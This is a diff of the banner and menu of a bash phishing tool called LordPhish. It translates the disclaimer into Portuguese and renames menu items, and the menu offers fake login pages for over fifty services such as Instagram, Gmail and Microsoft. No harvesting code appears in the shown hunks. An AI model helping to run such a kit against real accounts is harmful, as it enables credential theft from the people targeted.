@@ -116,11 +116,11 @@ printf "      ${boldWhite}  .:.  VERSÃO BETA  .:.  ${resret}\n"
 printf "\n"
 printf "   ${lightGreen}[${boldLightGray}+${lightGreen}]${resret}${boldYellow} Tool Created by LEO MODS ${resret}\n"
 printf "\n"
-printf "     ${boldWhiteOnLightRed}:: Disclaimer: Developers assume no liability and are not    ::${resret}\n"
-printf "     ${boldWhiteOnLightRed}:: responsible for any misuse or damage caused by LordPhish.  ::${resret}\n"
-printf "     ${boldWhiteOnLightRed}:: Only use for educational purposes!!                      ::${resret}\n"
+printf "     ${boldWhiteOnLightRed}:: Isenção de responsabilidade: os desenvolvedores não assumem nenhuma responsabilidade e não são    ::${resret}\n"
+printf "     ${boldWhiteOnLightRed}:: responsável por qualquer uso indevido ou dano causado por LordPhish.  ::${resret}\n"
+printf "     ${boldWhiteOnLightRed}:: Use somente para fins educacionais!!                      ::${resret}\n"
 printf "\n"
-printf "     ${boldWhiteOnLightRed}:: Attacking targets without mutual consent is illegal!      ::${resret}\n"
+printf "     ${boldWhiteOnLightRed}:: Atacar alvos sem consentimento mútuo é ilegall!      ::${resret}\n"
 printf "\n"
 }
 
@@ -149,7 +149,7 @@ menu() {
     echo -e "${red}║${W}██████${red}║${W}█████████${red}║${reset}"
    printf "      ${boldWhite}  .:.  VERSÃO BETA  .:.   ${reset}\n"
 printf "\n"
-printf "   ${lightGreen}[${boldLightGray}+${lightGreen}]${reset}${boldYellow} Tool Created by LEO MODS OFV ${reset}\n"
+printf "   ${lightGreen}[${boldLightGray}+${lightGreen}]${reset}${boldYellow} Tool Created by LEO MODS OFC ${reset}\n"
 printf "\n"
 printf "${lightGreen}[${boldLightGray}01${lightGreen}]${reset}${cyan} Instagram${reset}      ${lightGreen}[${boldLightGray}18${lightGreen}]${reset}${cyan} eBay   ${reset}          ${lightGreen}[${boldLightGray}35${lightGreen}]${reset}${cyan} Gmail   ${reset}   \n"
 printf "${lightGreen}[${boldLightGray}02${lightGreen}]${reset}${cyan} Facebook${reset}       ${lightGreen}[${boldLightGray}19${lightGreen}]${reset}${cyan} lol  ${reset}            ${lightGreen}[${boldLightGray}36${lightGreen}]${reset}${cyan} Tiktok  ${reset}      \n"
@@ -168,7 +168,7 @@ printf "${lightGreen}[${boldLightGray}14${lightGreen}]${reset}${cyan} Protonmail
 printf "${lightGreen}[${boldLightGray}15${lightGreen}]${reset}${cyan} Wordpress${reset}      ${lightGreen}[${boldLightGray}32${lightGreen}]${reset}${cyan} Yandex   ${reset}        ${lightGreen}[${boldLightGray}49${lightGreen}]${reset}${cyan} Xvideos${reset}     \n"
 printf "${lightGreen}[${boldLightGray}16${lightGreen}]${reset}${cyan} Microsoft${reset}      ${lightGreen}[${boldLightGray}33${lightGreen}]${reset}${cyan} DevianART   ${reset}     ${lightGreen}[${boldLightGray}50${lightGreen}]${reset}${cyan} Games Pages${reset}\n"
 printf "${lightGreen}[${boldLightGray}17${lightGreen}]${reset}${cyan} Youtube${reset}        ${lightGreen}[${boldLightGray}34${lightGreen}]${reset}${cyan} StackOverflow${reset}    ${lightGreen}[${boldLightGray}51${lightGreen}]${reset}${cyan} operadoras${reset} \n"
-printf "${lightGreen}[${boldLightGray}99${lightGreen}]${reset}${red} Custom ${reset}        ${lightGreen}[${boldLightGray}Y${lightGreen}]${reset}${red} Youtube channel ${reset}  ${lightGreen}[${boldLightGray}T${lightGreen}]${reset}${red} Telegram Group${reset} \n"     
+printf "${lightGreen}[${boldLightGray}99${lightGreen}]${reset}${red} Custom ${reset}        ${lightGreen}[${boldLightGray}Y${lightGreen}]${reset}${red} CANAL YT${reset}  ${lightGreen}[${boldLightGray}T${lightGreen}]${reset}${red} CONTATO TELEGRAM${reset} \n"     
 printf "${lightGreen}[${boldLightGray}00${lightGreen}]${reset}${red} Exit${reset}           ${lightGreen}[${boldLightGray}F${lightGreen}]${reset}${red} Follow me one Github${reset}\n"
 read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' menu_option
 
